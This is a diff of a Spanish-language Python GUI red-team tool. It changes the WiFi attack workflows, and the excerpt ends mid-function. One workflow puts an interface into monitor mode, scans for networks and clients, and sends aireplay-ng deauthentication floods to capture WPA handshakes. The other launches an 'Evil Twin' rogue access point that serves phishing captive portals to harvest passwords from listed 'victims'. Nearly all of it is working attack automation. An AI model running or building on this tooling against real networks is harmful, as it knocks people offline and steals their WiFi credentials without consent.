@@ -461,7 +461,6 @@ class RedTeamApp(ctk.CTk):
         os.makedirs(self.session_dir_nmap, exist_ok=True)   # Asegura que la carpeta exista
         comando = cmd_template.replace("{TARGET}", target).replace("{SESSION}", self.session_dir_nmap)
         self.ejecutar_comando(f"nmap {comando}")
-
     def _mostrar_explorador_nmap(self):
         self.limpiar_main_frame()
         self.agregar_boton_atras(self.show_recon_menu)
@@ -582,114 +581,168 @@ class RedTeamApp(ctk.CTk):
         timestamp = datetime.now().strftime("%Y%m%d_%H%M%S_%f")
         return f"/tmp/{prefijo}_{timestamp}"
 
+    # ==========================================
+    # 1. CAPTURA DE HANDSHAKE 
+    # ==========================================
     def _wifi_captura_handshake(self):
-        # Paso 1: Seleccionar interfaz
         self.limpiar_main_frame()
         self.agregar_boton_atras(self.show_wifi_menu)
-        ctk.CTkLabel(self.main_frame, text="CAPTURA HANDSHAKE - Selecciona Interfaz", 
-                     font=ctk.CTkFont(size=16, weight="bold")).pack(pady=10)
+        ctk.CTkLabel(self.main_frame, text="CAPTURAR: Elija IFace", font=ctk.CTkFont(size=18, weight="bold")).pack(pady=10)
+        
+        self.handshake_iface_btns = []
         interfaces = self.obtener_interfaces_red()
         if not interfaces:
             ctk.CTkLabel(self.main_frame, text="No hay interfaces.").pack()
             return
+            
+        frame = ctk.CTkScrollableFrame(self.main_frame, height=300)
+        frame.pack(fill="both", expand=True, padx=20, pady=10)
+        
         for iface in interfaces:
-            ctk.CTkButton(self.main_frame, text=iface, fg_color=COLOR_BOTON_ROJO, hover_color=COLOR_BOTON_HOVER,
-                         command=lambda i=iface: self._wifi_escanear_redes_handshake(i)).pack(fill="x", padx=40, pady=5)
+            btn = ctk.CTkButton(frame, text=iface, fg_color=COLOR_BOTON_ROJO, hover_color=COLOR_BOTON_HOVER,
+                              command=lambda i=iface: self._wifi_escanear_redes_handshake(i))
+            btn.pack(fill="x", pady=5)
+            self.handshake_iface_btns.append(btn)
+                              
         self.mostrar_consola()
 
     def _wifi_escanear_redes_handshake(self, iface):
+        # Bloquear los botones al hacer clic
+        for btn in getattr(self, 'handshake_iface_btns', []):
+            if btn.winfo_exists():
+                btn.configure(fg_color="#4a4a4a", state="disabled")
+
         self.wifi_state = {"iface": iface, "mon_iface": None}
-        # Activar modo monitor
-        self.escribir_consola(f"[*] Activando modo monitor en {iface}...")
-        os.system("sudo airmon-ng check kill >/dev/null 2>&1")
-        os.system(f"sudo airmon-ng start {iface} >/dev/null 2>&1")
-        if os.path.exists(f"/sys/class/net/{iface}mon"):
-            self.wifi_state["mon_iface"] = f"{iface}mon"
-        else:
-            self.wifi_state["mon_iface"] = iface
-        mon = self.wifi_state["mon_iface"]
-        self.escribir_consola(f"[*] Escaneando con {mon} durante 15 segundos...")
-        
-        # Escaneo con archivo temporal dinámico
+        self.escribir_consola(f"[*] Preparando modo monitor en {iface}...")
+
         scan_prefix = self._generar_nombre_temporal("wifi_handshake")
-        self.wifi_state["scan_file"] = scan_prefix  # Guardar para posible limpieza
-        
+        self.wifi_state["scan_file"] = scan_prefix
+
         def escanear():
-            os.system(f"sudo timeout 15s airodump-ng {mon} -w {scan_prefix} --output-format csv >/dev/null 2>&1")
+            subprocess.run(["sudo", "airmon-ng", "check", "kill"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            subprocess.run(["sudo", "airmon-ng", "start", iface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            
+            mon = f"{iface}mon" if os.path.exists(f"/sys/class/net/{iface}mon") else iface
+            self.wifi_state["mon_iface"] = mon
+            
+            self.after(0, lambda: self.escribir_consola(f"[*] Escaneando 15s en {mon}..."))
+
+            subprocess.run(f"sudo timeout -k 5 15s airodump-ng {mon} -w {scan_prefix} --output-format csv",
+                           shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
             redes = []
             try:
                 with open(f"{scan_prefix}-01.csv", "r", errors="ignore") as f:
-                    contenido = f.read()
-                    partes = contenido.split("Station MAC,")
+                    partes = f.read().split("Station MAC,")
                     for linea in partes[0].split("\n")[2:]:
                         r = linea.split(",")
                         if len(r) >= 14 and ":" in r[0]:
-                            redes.append({"bssid": r[0].strip(), "ch": r[3].strip(), 
+                            redes.append({"bssid": r[0].strip(), "ch": r[3].strip(),
                                          "essid": r[13].strip() if r[13].strip() else "<Oculta>"})
-            except Exception as e:
-                self.escribir_consola(f"[!] Error escaneo: {e}")
+            except: pass
             finally:
-                # Limpiar archivos temporales
                 for ext in ['-01.csv', '-01.cap', '-01.kismet.csv', '-01.kismet.netxml']:
-                    try:
-                        os.remove(f"{scan_prefix}{ext}")
-                    except:
-                        pass
+                    try: os.remove(f"{scan_prefix}{ext}")
+                    except: pass
+            
             self.after(0, lambda: self._wifi_mostrar_redes_handshake(redes))
+            
         threading.Thread(target=escanear, daemon=True).start()
-        self.escribir_consola("[*] Escaneando, espera...")
 
     def _wifi_mostrar_redes_handshake(self, redes):
         self.limpiar_main_frame()
         self.agregar_boton_atras(self._wifi_captura_handshake)
-        ctk.CTkLabel(self.main_frame, text="SELECCIONA RED OBJETIVO", font=ctk.CTkFont(size=16, weight="bold")).pack(pady=10)
+        ctk.CTkLabel(self.main_frame, text="SELECCIONA RED", font=ctk.CTkFont(size=18, weight="bold")).pack(pady=10)
         if not redes:
-            ctk.CTkLabel(self.main_frame, text="No se encontraron redes.").pack()
+            ctk.CTkLabel(self.main_frame, text="No hay redes.").pack()
             return
+            
         frame = ctk.CTkScrollableFrame(self.main_frame, height=300)
         frame.pack(fill="both", expand=True, padx=20, pady=10)
+        
         for red in redes:
-            texto = f"{red['essid']} (CH:{red['ch']} | {red['bssid']})"
+            texto = f"{red['essid']} (CH:{red['ch']})"
             btn = ctk.CTkButton(frame, text=texto, fg_color="#2b2b2b", hover_color=COLOR_BOTON_HOVER,
-                               command=lambda r=red: self._wifi_seleccionar_cliente_handshake(r))
+                              command=lambda r=red: self._wifi_seleccionar_cliente_handshake(r))
             btn.pack(fill="x", pady=3)
         self.mostrar_consola()
 
     def _wifi_seleccionar_cliente_handshake(self, red):
         self.wifi_state["target"] = red
-        # Escanear clientes asociados
-        mon = self.wifi_state["mon_iface"]
-        scan_prefix = self._generar_nombre_temporal("wifi_clients")
-        os.system(f"sudo timeout 10s airodump-ng --bssid {red['bssid']} -c {red['ch']} {mon} -w {scan_prefix} --output-format csv >/dev/null 2>&1")
-        clientes = []
-        try:
-            with open(f"{scan_prefix}-01.csv", "r", errors="ignore") as f:
-                partes = f.read().split("Station MAC,")
-                if len(partes) > 1:
-                    for linea in partes[1].split("\n")[1:]:
-                        c = linea.split(",")
-                        if len(c) >= 6 and ":" in c[0]:
-                            clientes.append(c[0].strip())
-        except: pass
-        finally:
-            for ext in ['-01.csv', '-01.cap', '-01.kismet.csv', '-01.kismet.netxml']:
-                try:
-                    os.remove(f"{scan_prefix}{ext}")
-                except:
-                    pass
         
         self.limpiar_main_frame()
-        self.agregar_boton_atras(lambda: self._wifi_mostrar_redes_handshake([red]))  # simplificado
-        ctk.CTkLabel(self.main_frame, text=f"CLIENTES EN {red['essid']}", font=ctk.CTkFont(size=16, weight="bold")).pack(pady=10)
-        frame = ctk.CTkScrollableFrame(self.main_frame, height=300)
-        frame.pack(fill="both", expand=True, padx=20, pady=10)
-        # Opción broadcast
-        ctk.CTkButton(frame, text="Todos (Broadcast)", fg_color=COLOR_BOTON_PELIGRO, hover_color="#cc7a00",
-                     command=lambda: self._wifi_iniciar_ataque_handshake("FF:FF:FF:FF:FF:FF")).pack(fill="x", pady=5)
-        for mac in clientes:
-            ctk.CTkButton(frame, text=mac, fg_color="#2b2b2b", hover_color=COLOR_BOTON_HOVER,
-                         command=lambda m=mac: self._wifi_iniciar_ataque_handshake(m)).pack(fill="x", pady=3)
+        self.agregar_boton_atras(lambda: self._wifi_mostrar_redes_handshake([red]))
+        ctk.CTkLabel(self.main_frame, text=f"ESCANEANDO CLIENTES\n{red['essid']}", font=ctk.CTkFont(size=18, weight="bold")).pack(pady=10)
         self.mostrar_consola()
+        self.escribir_consola(f"[*] Capturando tráfico de {red['essid']} por 10s...")
+
+        def escanear_clientes():
+            mon = self.wifi_state["mon_iface"]
+            scan_prefix = self._generar_nombre_temporal("wifi_clients")
+            
+            subprocess.run(f"sudo timeout -k 5 10s airodump-ng --bssid {red['bssid']} -c {red['ch']} {mon} -w {scan_prefix} --output-format csv",
+                           shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            
+            clientes = []
+            try:
+                with open(f"{scan_prefix}-01.csv", "r", errors="ignore") as f:
+                    partes = f.read().split("Station MAC,")
+                    if len(partes) > 1:
+                        for linea in partes[1].split("\n")[1:]:
+                            c = linea.split(",")
+                            if len(c) >= 6 and ":" in c[0]: 
+                                clientes.append(c[0].strip())
+            except: pass
+            finally:
+                for ext in ['-01.csv', '-01.cap', '-01.kismet.csv', '-01.kismet.netxml']:
+                    try: os.remove(f"{scan_prefix}{ext}")
+                    except: pass
+
+            def actualizar_gui():
+                self.limpiar_main_frame()
+                self.agregar_boton_atras(lambda: self._wifi_mostrar_redes_handshake([red]))
+                ctk.CTkLabel(self.main_frame, text="CLIENTES ENCONTRADOS", font=ctk.CTkFont(size=18, weight="bold")).pack(pady=10)
+                
+                frame = ctk.CTkScrollableFrame(self.main_frame, height=300)
+                frame.pack(fill="both", expand=True, padx=20, pady=10)
+                
+                self.handshake_client_btns = []
+                
+                btn_fin = ctk.CTkButton(frame, text="FINALIZAR AUDITORÍA", fg_color=COLOR_BOTON_PELIGRO, hover_color="#cc7a00",
+                                            command=self._wifi_finalizar_handshake)
+                btn_fin.pack(fill="x", pady=5)
+                self.handshake_client_btns.append(btn_fin)
+
+                btn_broad = ctk.CTkButton(frame, text="Todos (Broadcast)", fg_color=COLOR_BOTON_PELIGRO, hover_color="#cc7a00",
+                                              command=lambda: self._wifi_iniciar_ataque_handshake("FF:FF:FF:FF:FF:FF"))
+                btn_broad.pack(fill="x", pady=5)
+                self.handshake_client_btns.append(btn_broad)
+                
+                for mac in clientes:
+                    btn = ctk.CTkButton(frame, text=mac, fg_color="#2b2b2b", hover_color=COLOR_BOTON_HOVER,
+                                            command=lambda m=mac: self._wifi_iniciar_ataque_handshake(m))
+                    btn.pack(fill="x", pady=3)
+                    self.handshake_client_btns.append(btn)
+                    
+                self.mostrar_consola()
+
+            self.after(0, actualizar_gui)
+
+        threading.Thread(target=escanear_clientes, daemon=True).start()
+
+    def _wifi_finalizar_handshake(self):
+        for btn in getattr(self, 'handshake_client_btns', []):
+            if btn.winfo_exists():
+                btn.configure(fg_color="#4a4a4a", state="disabled")
+        
+        self.escribir_consola("[*] Finalizando auditoría y restaurando red...")
+        def restore():
+            mon = self.wifi_state.get("mon_iface")
+            if mon:
+                subprocess.run(["sudo", "airmon-ng", "stop", mon], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            subprocess.run(["sudo", "systemctl", "restart", "NetworkManager"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            self.after(0, self.show_wifi_menu)
+            
+        threading.Thread(target=restore, daemon=True).start()
 
     def _wifi_iniciar_ataque_handshake(self, cliente_mac):
         red = self.wifi_state["target"]
@@ -697,351 +750,368 @@ class RedTeamApp(ctk.CTk):
         timestamp = datetime.now().strftime("%Y-%m-%d-%H-%M-%S")
         session_dir = os.path.join(BASE_DIR_WIFI, f"Auditoria-{timestamp}")
         os.makedirs(session_dir, exist_ok=True)
-        
-        # Iniciar airodump en segundo plano
-        cmd_airodump = f"sudo airodump-ng --channel {red['ch']} --bssid {red['bssid']} -w {session_dir}/Captura {mon} >/dev/null 2>&1 &"
-        os.system(cmd_airodump)
+        subprocess.Popen(["sudo", "airodump-ng", "--channel", red['ch'], "--bssid", red['bssid'],
+                         "-w", f"{session_dir}/Captura", mon], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         time.sleep(2)
-        # Enviar deauth
         cmd_deauth = f"sudo aireplay-ng -0 10 -a {red['bssid']} -c {cliente_mac} {mon}"
-        self.ejecutar_comando(cmd_deauth, callback_after=lambda: self.escribir_consola(f"[+] Captura guardada en {session_dir}"))
-        self.escribir_consola("[*] Ataque en curso. Espera handshake...")
+        self.ejecutar_comando(cmd_deauth, callback_after=lambda: self.escribir_consola(f"[+] Salvado: {session_dir}"))
+        self.escribir_consola("[*] Esperando handshake...")
 
     # ==========================================
-    # MÉTODOS DE EVIL TWIN (MODIFICADOS CON MANEJO DE PROCESOS)
+    # 2. EVIL TWIN (IDÉNTICO A RASPI.PY)
     # ==========================================
     def _wifi_evil_twin(self):
-        """Inicia el flujo de Evil Twin: selección de interfaz AP"""
         self.limpiar_main_frame()
         self.agregar_boton_atras(self.show_wifi_menu)
-        ctk.CTkLabel(self.main_frame, text="EVIL TWIN - Selecciona Interfaz para AP Malicioso",
-                     font=ctk.CTkFont(size=16, weight="bold")).pack(pady=10)
+        ctk.CTkLabel(self.main_frame, text="EVIL TWIN - IFace AP", font=ctk.CTkFont(size=18, weight="bold")).pack(pady=10)
+        
         interfaces = self.obtener_interfaces_red()
         if len(interfaces) < 2:
-            ctk.CTkLabel(self.main_frame, text="Se necesitan al menos 2 interfaces WiFi (una para AP y otra para Deauth).").pack()
+            ctk.CTkLabel(self.main_frame, text="Requiere 2 interfaces.").pack()
             return
+            
+        frame = ctk.CTkScrollableFrame(self.main_frame, height=300)
+        frame.pack(fill="both", expand=True, padx=20, pady=10)
+
+        self.evil_ap_btns = []
         for iface in interfaces:
-            ctk.CTkButton(self.main_frame, text=f"AP: {iface}", fg_color=COLOR_BOTON_ROJO,
-                          hover_color=COLOR_BOTON_HOVER,
-                          command=lambda i=iface: self._evil_twin_select_deauth(i)).pack(fill="x", padx=40, pady=5)
+            btn = ctk.CTkButton(frame, text=f"AP: {iface}", fg_color=COLOR_BOTON_ROJO, hover_color=COLOR_BOTON_HOVER,
+                              command=lambda i=iface: self._evil_twin_select_deauth(i))
+            btn.pack(fill="x", pady=5)
+            self.evil_ap_btns.append(btn)
+                              
         self.mostrar_consola()
 
     def _evil_twin_select_deauth(self, ap_iface):
-        """Guarda interfaz AP y solicita interfaz para Deauth"""
+        for btn in getattr(self, 'evil_ap_btns', []):
+            if btn.winfo_exists():
+                btn.configure(fg_color="#4a4a4a", state="disabled")
+
         self.wifi_state["ap_iface"] = ap_iface
         self.limpiar_main_frame()
         self.agregar_boton_atras(self._wifi_evil_twin)
-        ctk.CTkLabel(self.main_frame, text="Selecciona Interfaz para Desautenticación",
-                     font=ctk.CTkFont(size=16, weight="bold")).pack(pady=10)
-        interfaces = [i for i in self.obtener_interfaces_red() if i != ap_iface]
-        for iface in interfaces:
-            ctk.CTkButton(self.main_frame, text=iface, fg_color=COLOR_BOTON_ROJO,
-                          hover_color=COLOR_BOTON_HOVER,
-                          command=lambda i=iface: self._evil_twin_escanear_redes(i)).pack(fill="x", padx=40, pady=5)
+        ctk.CTkLabel(self.main_frame, text="IFace Deauth", font=ctk.CTkFont(size=18, weight="bold")).pack(pady=10)
+        
+        frame = ctk.CTkScrollableFrame(self.main_frame, height=300)
+        frame.pack(fill="both", expand=True, padx=20, pady=10)
+
+        self.evil_deauth_btns = []
+        for iface in [i for i in self.obtener_interfaces_red() if i != ap_iface]:
+            btn = ctk.CTkButton(frame, text=iface, fg_color=COLOR_BOTON_ROJO, hover_color=COLOR_BOTON_HOVER,
+                              command=lambda i=iface: self._evil_twin_escanear_redes(i))
+            btn.pack(fill="x", pady=5)
+            self.evil_deauth_btns.append(btn)
+                              
         self.mostrar_consola()
 
     def _evil_twin_escanear_redes(self, deauth_iface):
-        """Escanea redes WiFi usando la interfaz de deauth en modo monitor"""
-        self.wifi_state["deauth_iface"] = deauth_iface
-        self.escribir_consola(f"[*] Preparando {deauth_iface} para escaneo...")
-        # Activar modo monitor
-        os.system("sudo airmon-ng check kill >/dev/null 2>&1")
-        os.system(f"sudo airmon-ng start {deauth_iface} >/dev/null 2>&1")
-        mon = f"{deauth_iface}mon" if os.path.exists(f"/sys/class/net/{deauth_iface}mon") else deauth_iface
-        self.wifi_state["mon_deauth"] = mon
+        for btn in getattr(self, 'evil_deauth_btns', []):
+            if btn.winfo_exists():
+                btn.configure(fg_color="#4a4a4a", state="disabled")
 
-        self.escribir_consola(f"[*] Escaneando redes con {mon} durante 15 segundos...")
+        self.wifi_state["deauth_iface"] = deauth_iface
+        self.escribir_consola(f"[*] Preparando interfaces para Evil Twin...")
+
         scan_prefix = self._generar_nombre_temporal("evil_scan")
         self.wifi_state["scan_file"] = scan_prefix
-        # Escaneo en segundo plano
+
         def escanear():
-            os.system(f"sudo timeout 15s airodump-ng {mon} -w {scan_prefix} --output-format csv >/dev/null 2>&1")
+            subprocess.run(["sudo", "airmon-ng", "check", "kill"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            subprocess.run(["sudo", "airmon-ng", "start", deauth_iface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            
+            mon = f"{deauth_iface}mon" if os.path.exists(f"/sys/class/net/{deauth_iface}mon") else deauth_iface
+            self.wifi_state["mon_deauth"] = mon
+
+            self.after(0, lambda: self.escribir_consola(f"[*] Escaneando redes en {mon}..."))
+
+            subprocess.run(f"sudo timeout -k 5 15s airodump-ng {mon} -w {scan_prefix} --output-format csv",
+                           shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
             redes = []
             try:
                 with open(f"{scan_prefix}-01.csv", "r", errors="ignore") as f:
-                    contenido = f.read()
-                    partes = contenido.split("Station MAC,")
+                    partes = f.read().split("Station MAC,")
                     for linea in partes[0].split("\n")[2:]:
                         r = linea.split(",")
                         if len(r) >= 14 and ":" in r[0]:
-                            redes.append({
-                                "bssid": r[0].strip(),
-                                "ch": r[3].strip(),
-                                "essid": r[13].strip() if r[13].strip() else "<Oculta>"
-                            })
-            except Exception as e:
-                self.escribir_consola(f"[!] Error al leer escaneo: {e}")
+                            redes.append(
+                                {"bssid": r[0].strip(), "ch": r[3].strip(),
+                                 "essid": r[13].strip() or "<Oculta>"})
+            except: pass
             finally:
                 for ext in ['-01.csv', '-01.cap', '-01.kismet.csv', '-01.kismet.netxml']:
-                    try:
-                        os.remove(f"{scan_prefix}{ext}")
-                    except:
-                        pass
+                    try: os.remove(f"{scan_prefix}{ext}")
+                    except: pass
+            
             self.after(0, lambda: self._evil_twin_mostrar_redes(redes))
+
         threading.Thread(target=escanear, daemon=True).start()
-        self.mostrar_consola()
-        self.escribir_consola("[*] Escaneando, espera...")
 
     def _evil_twin_mostrar_redes(self, redes):
-        """Muestra las redes encontradas para seleccionar objetivo"""
         self.limpiar_main_frame()
         self.agregar_boton_atras(self._wifi_evil_twin)
-        ctk.CTkLabel(self.main_frame, text="SELECCIONA RED OBJETIVO",
-                     font=ctk.CTkFont(size=16, weight="bold")).pack(pady=10)
+        ctk.CTkLabel(self.main_frame, text="RED OBJETIVO", font=ctk.CTkFont(size=18, weight="bold")).pack(pady=10)
         if not redes:
-            ctk.CTkLabel(self.main_frame, text="No se encontraron redes WiFi.").pack()
+            ctk.CTkLabel(self.main_frame, text="No hay redes.").pack()
             return
+            
         frame = ctk.CTkScrollableFrame(self.main_frame, height=300)
         frame.pack(fill="both", expand=True, padx=20, pady=10)
+        
         for red in redes:
-            texto = f"{red['essid']} (CH:{red['ch']} | {red['bssid']})"
+            texto = f"{red['essid']} (CH:{red['ch']})"
             btn = ctk.CTkButton(frame, text=texto, fg_color="#2b2b2b", hover_color=COLOR_BOTON_HOVER,
-                                command=lambda r=red: self._evil_twin_seleccionar_portal(r))
+                              command=lambda r=red: self._evil_twin_seleccionar_portal(r))
             btn.pack(fill="x", pady=3)
         self.mostrar_consola()
 
     def _evil_twin_seleccionar_portal(self, red):
-        """Guarda red objetivo y permite elegir portal cautivo"""
         self.wifi_state["target"] = red
         self.limpiar_main_frame()
-        self.agregar_boton_atras(lambda: self._evil_twin_mostrar_redes([red]))  # simplificado
-        ctk.CTkLabel(self.main_frame, text="SELECCIONA PORTAL CAUTIVO",
-                     font=ctk.CTkFont(size=16, weight="bold")).pack(pady=10)
+        self.agregar_boton_atras(lambda: self._evil_twin_mostrar_redes([red]))
+        ctk.CTkLabel(self.main_frame, text="PORTAL CAUTIVO", font=ctk.CTkFont(size=18, weight="bold")).pack(pady=10)
+        
         portals_dir = os.path.join(os.path.dirname(__file__), "evil_portals")
         os.makedirs(portals_dir, exist_ok=True)
         portales = [d for d in os.listdir(portals_dir) if os.path.isdir(os.path.join(portals_dir, d))]
         if not portales:
-            ctk.CTkLabel(self.main_frame, text="No hay portales en 'evil_portals/'. Crea una subcarpeta con index.html").pack()
+            ctk.CTkLabel(self.main_frame, text="No hay portales.").pack()
             return
+            
         frame = ctk.CTkScrollableFrame(self.main_frame, height=300)
         frame.pack(fill="both", expand=True, padx=20, pady=10)
+        
         for portal in sorted(portales):
-            ruta_portal = os.path.join(portals_dir, portal)
-            if os.path.isfile(os.path.join(ruta_portal, "index.html")):
-                btn = ctk.CTkButton(frame, text=portal, fg_color=COLOR_BOTON_ROJO,
-                                    hover_color=COLOR_BOTON_HOVER,
-                                    command=lambda p=portal: self._evil_twin_seleccionar_deauth_mode(red, p))
+            if os.path.isfile(os.path.join(portals_dir, portal, "index.html")):
+                btn = ctk.CTkButton(frame, text=portal, fg_color=COLOR_BOTON_ROJO, hover_color=COLOR_BOTON_HOVER,
+                                  command=lambda p=portal: self._evil_twin_seleccionar_deauth_mode(red, p))
                 btn.pack(fill="x", pady=3)
         self.mostrar_consola()
 
     def _evil_twin_seleccionar_deauth_mode(self, red, portal):
-        """Elige modo de desautenticación (broadcast o dirigido)"""
         self.wifi_state["portal_name"] = portal
         self.limpiar_main_frame()
         self.agregar_boton_atras(lambda: self._evil_twin_seleccionar_portal(red))
-        ctk.CTkLabel(self.main_frame, text="MODO DE DESAUTENTICACIÓN",
-                     font=ctk.CTkFont(size=16, weight="bold")).pack(pady=10)
-        ctk.CTkButton(self.main_frame, text="Broadcast (Desconectar todos - Recomendado)",
-                      fg_color=COLOR_BOTON_PELIGRO,
+        ctk.CTkLabel(self.main_frame, text="MODO DEAUTH", font=ctk.CTkFont(size=18, weight="bold")).pack(pady=10)
+        
+        ctk.CTkButton(self.main_frame, text="Broadcast", fg_color=COLOR_BOTON_PELIGRO, hover_color="#cc7a00",
                       command=lambda: self._evil_twin_ejecutar(red, portal, "broadcast")).pack(fill="x", padx=40, pady=10)
-        ctk.CTkButton(self.main_frame, text="Dirigido (Elegir cliente específico)",
-                      fg_color=COLOR_BOTON_ROJO,
+        ctk.CTkButton(self.main_frame, text="Dirigido", fg_color=COLOR_BOTON_ROJO, hover_color=COLOR_BOTON_HOVER,
                       command=lambda: self._evil_twin_escanear_clientes(red, portal)).pack(fill="x", padx=40, pady=10)
+                          
         self.mostrar_consola()
 
     def _evil_twin_escanear_clientes(self, red, portal):
-        """Escanea clientes asociados a la red objetivo para deauth dirigido"""
-        mon = self.wifi_state.get("mon_deauth")
-        if not mon:
-            self.escribir_consola("[!] No se encontró interfaz monitor. Reintenta.")
-            return
-        self.escribir_consola(f"[*] Escaneando clientes en {red['essid']}...")
-        scan_prefix = self._generar_nombre_temporal("evil_clients")
-        os.system(f"sudo timeout 10s airodump-ng --bssid {red['bssid']} -c {red['ch']} {mon} -w {scan_prefix} --output-format csv >/dev/null 2>&1")
-        clientes = []
-        try:
-            with open(f"{scan_prefix}-01.csv", "r", errors="ignore") as f:
-                partes = f.read().split("Station MAC,")
-                if len(partes) > 1:
-                    for linea in partes[1].split("\n")[1:]:
-                        c = linea.split(",")
-                        if len(c) >= 6 and ":" in c[0]:
-                            clientes.append(c[0].strip())
-        except: pass
-        finally:
-            for ext in ['-01.csv', '-01.cap', '-01.kismet.csv', '-01.kismet.netxml']:
-                try:
-                    os.remove(f"{scan_prefix}{ext}")
-                except:
-                    pass
-
         self.limpiar_main_frame()
         self.agregar_boton_atras(lambda: self._evil_twin_seleccionar_deauth_mode(red, portal))
-        ctk.CTkLabel(self.main_frame, text=f"CLIENTES EN {red['essid']}",
-                     font=ctk.CTkFont(size=16, weight="bold")).pack(pady=10)
-        if not clientes:
-            ctk.CTkLabel(self.main_frame, text="No se detectaron clientes. Usa modo Broadcast.").pack()
-            return
-        frame = ctk.CTkScrollableFrame(self.main_frame, height=300)
-        frame.pack(fill="both", expand=True, padx=20, pady=10)
-        for mac in clientes:
-            btn = ctk.CTkButton(frame, text=mac, fg_color="#2b2b2b", hover_color=COLOR_BOTON_HOVER,
-                                command=lambda m=mac: self._evil_twin_ejecutar(red, portal, "directed", m))
-            btn.pack(fill="x", pady=3)
+        ctk.CTkLabel(self.main_frame, text=f"BUSCANDO VÍCTIMAS\n{red['essid']}", font=ctk.CTkFont(size=18, weight="bold")).pack(pady=10)
         self.mostrar_consola()
+        self.escribir_consola("[*] Rastreando clientes objetivos (10s)...")
+
+        def escanear():
+            mon = self.wifi_state.get("mon_deauth")
+            scan_prefix = self._generar_nombre_temporal("evil_clients")
+            
+            subprocess.run(
+                f"sudo timeout -k 5 10s airodump-ng --bssid {red['bssid']} -c {red['ch']} {mon} -w {scan_prefix} --output-format csv",
+                shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            
+            clientes = []
+            try:
+                with open(f"{scan_prefix}-01.csv", "r", errors="ignore") as f:
+                    partes = f.read().split("Station MAC,")
+                    if len(partes) > 1:
+                        for linea in partes[1].split("\n")[1:]:
+                            c = linea.split(",")
+                            if len(c) >= 6 and ":" in c[0]: 
+                                clientes.append(c[0].strip())
+            except: pass
+            finally:
+                for ext in ['-01.csv', '-01.cap', '-01.kismet.csv', '-01.kismet.netxml']:
+                    try: os.remove(f"{scan_prefix}{ext}")
+                    except: pass
+
+            def actualizar_gui():
+                self.limpiar_main_frame()
+                self.agregar_boton_atras(lambda: self._evil_twin_seleccionar_deauth_mode(red, portal))
+                ctk.CTkLabel(self.main_frame, text="SELECCIONAR MAC", font=ctk.CTkFont(size=18, weight="bold")).pack(pady=10)
+                
+                frame = ctk.CTkScrollableFrame(self.main_frame, height=300)
+                frame.pack(fill="both", expand=True, padx=20, pady=10)
+                
+                for mac in clientes:
+                    btn = ctk.CTkButton(frame, text=mac, fg_color="#2b2b2b", hover_color=COLOR_BOTON_HOVER,
+                                      command=lambda m=mac: self._evil_twin_ejecutar(red, portal, "directed", m))
+                    btn.pack(fill="x", pady=3)
+                self.mostrar_consola()
+            
+            self.after(0, actualizar_gui)
+
+        threading.Thread(target=escanear, daemon=True).start()
 
     def _evil_twin_ejecutar(self, red, portal, deauth_mode, cliente_mac=None):
-        """Configura y lanza el ataque Evil Twin completo con control de procesos."""
         timestamp = datetime.now().strftime("%Y-%m-%d-%H-%M-%S")
-        session_dir = os.path.join(BASE_DIR_EVIL, f"Auditoria-{timestamp}")
+        session_dir = os.path.abspath(os.path.join(BASE_DIR_EVIL, f"Auditoria-{timestamp}"))
         os.makedirs(session_dir, exist_ok=True)
 
         self.limpiar_main_frame()
         self.agregar_boton_atras(self.show_wifi_menu)
-        ctk.CTkLabel(self.main_frame, text="EVIL TWIN EN EJECUCIÓN",
-                     font=ctk.CTkFont(size=18, weight="bold")).pack(pady=10)
-        info_text = f"AP: {self.wifi_state['ap_iface']} | Objetivo: {red['essid']} | Portal: {portal}"
-        ctk.CTkLabel(self.main_frame, text=info_text).pack()
-        ctk.CTkButton(self.main_frame, text="DETENER ATAQUE", fg_color=COLOR_BOTON_PELIGRO,
-                      command=self._evil_twin_detener).pack(pady=10)
+        ctk.CTkLabel(self.main_frame, text="EVIL TWIN ACTIVO", font=ctk.CTkFont(size=18, weight="bold")).pack(pady=10)
+        
+        self.btn_detener_evil = ctk.CTkButton(self.main_frame, text="DETENER ATAQUE", fg_color=COLOR_BOTON_PELIGRO, hover_color="#cc7a00",
+                          command=self._evil_twin_detener_click)
+        self.btn_detener_evil.pack(fill="x", padx=40, pady=10)
+                          
         self.mostrar_consola()
-        self.escribir_consola(f"[!] Iniciando Evil Twin contra {red['essid']} ({red['bssid']})")
-        self.escribir_consola(f"[*] Portal: {portal} | Modo Deauth: {deauth_mode}")
-        self.escribir_consola(f"[*] Resultados en: {session_dir}")
-
         self.evil_twin_stop = False
 
         def ataque():
-            # Limpiar procesos previos (usar terminate en lugar de pkill)
+            import shutil
             self._evil_twin_limpiar_procesos()
-
             ap_iface = self.wifi_state["ap_iface"]
             deauth_iface = self.wifi_state.get("deauth_iface")
             mon_deauth = self.wifi_state.get("mon_deauth")
 
             if not mon_deauth:
-                # Activar modo monitor en interfaz de deauth
-                os.system(f"sudo airmon-ng start {deauth_iface} >/dev/null 2>&1")
-                mon_deauth = f"{deauth_iface}mon" if os.path.exists(f"/sys/class/net/{deauth_iface}mon") else deauth_iface
+                subprocess.run(["sudo", "airmon-ng", "start", deauth_iface], stdout=subprocess.DEVNULL,
+                               stderr=subprocess.DEVNULL)
+                mon_deauth = f"{deauth_iface}mon" if os.path.exists(
+                    f"/sys/class/net/{deauth_iface}mon") else deauth_iface
                 self.wifi_state["mon_deauth"] = mon_deauth
 
-            # Copiar portal a /tmp (usar timestamp para evitar colisiones)
+            # Copia segura
             portals_dir = os.path.join(os.path.dirname(__file__), "evil_portals")
             tmp_web = f"/tmp/evil_twin_web_{timestamp}"
             os.makedirs(tmp_web, exist_ok=True)
-            os.system(f"cp -r {portals_dir}/{portal}/* {tmp_web}/ 2>/dev/null")
+            
+            try:
+                ruta_origen = os.path.join(portals_dir, portal)
+                shutil.copytree(ruta_origen, tmp_web, dirs_exist_ok=True)
+            except Exception as e:
+                self.escribir_consola(f"[!] Aviso al copiar archivos: {e}")
 
-            # Script de captura
